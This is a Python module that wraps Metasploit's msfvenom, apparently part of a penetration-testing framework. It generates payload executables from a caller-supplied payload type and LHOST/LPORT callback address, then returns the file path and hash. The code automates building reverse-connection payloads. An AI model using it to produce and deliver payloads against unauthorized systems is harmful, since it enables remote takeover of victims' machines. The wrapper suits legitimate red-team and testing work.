# spectrenet/wrappers/builtin/msfvenom.py
import hashlib
import subprocess
import tempfile
from pathlib import Path
from uuid import uuid4
from spectrenet.wrappers.base import ToolWrapper

class MsfvenomWrapper(ToolWrapper):
    tool_name = "msfvenom"
    binary = "msfvenom"

    @property
    def schema(self) -> dict:
        return {"payload_path": str, "hash": str, "delivery_method": str}

    def parse(self, path: Path, fmt: str) -> dict:
        payload_bytes = path.read_bytes()
        return {
            "payload_path": str(path),
            "hash": hashlib.sha256(payload_bytes).hexdigest(),
            "delivery_method": fmt,
        }

    def run(self, payload_type: str, lhost: str, lport: int,
            fmt: str = "exe", output_dir: str | None = None, **kwargs) -> dict:
        out_dir = Path(output_dir) if output_dir else Path(tempfile.gettempdir())
        out_path = out_dir / f"payload_{uuid4().hex[:8]}.{fmt}"
        cmd = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", str(out_path),
        ]
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True)
        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"msfvenom failed: {e.stderr}") from e
        return self.parse(out_path, fmt)
